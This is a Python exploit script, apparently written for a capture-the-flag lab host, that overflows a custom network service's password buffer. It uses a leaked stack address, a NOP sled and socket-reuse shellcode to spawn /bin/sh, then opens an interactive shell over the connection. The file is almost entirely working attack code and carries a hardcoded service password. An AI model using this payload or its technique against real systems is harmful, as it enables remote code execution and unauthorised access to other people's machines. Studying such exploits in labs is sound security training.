#!/usr/bin/env python

"""

Canary                        : No
NX                            : No
PIE                           : No
Fortify                       : No
RelRO                         : Partial


this is an example from remote service:

	OK Ready. Send USER command.
	DEBUG
	OK DEBUG mode on.
	USER admin
	OK Send PASS command.
	PASS 1974jailbreak!
	Debug: userpass buffer @ 0xffffd610
	OK Authentication success. Send command.



"""

import socket
import struct
import telnetlib

def p32(address):
	return struct.pack("<I", address)

def interact(s):
	print "trying to interact..."
        shell = telnetlib.Telnet()
	shell.sock = s
	shell.interact()

def exploit(payload):
	s = socket.socket()
	s.connect((HOST, PORT))
	s.recv(1024)
	s.send("DEBUG\n")
	s.recv(1024)
	s.send("USER admin\n")
	s.recv(1024)
	s.send("PASS " + (payload) + "\n")
	response = s.recv(1024)
	interact(s)
	s.close()

HOST = "10.10.10.34"
PORT = 7411

username = "admin"
password = "1974jailbreak!" 

# https://www.exploit-db.com/exploits/34060

shellcode = b""
shellcode += b"\x6a\x02\x5b\x6a\x29\x58\xcd\x80\x48\x89\xc6"
shellcode += b"\x31\xc9\x56\x5b\x6a\x3f\x58\xcd\x80\x41\x80"
shellcode += b"\xf9\x03\x75\xf5\x6a\x0b\x58\x99\x52\x31\xf6"
shellcode += b"\x56\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e"
shellcode += b"\x89\xe3\x31\xc9\xcd\x80"


offset = 28
junk = "A" * offset
nop = "\x90" * 32

leak = (0xffffd610 + 32)
payload = junk + p32(leak)  + nop + shellcode

print "jumping to {}...".format(hex((leak)))
print "trying to trigger the exploit..."
try:
    exploit(payload)
except:
	pass
print "exploit failed..."

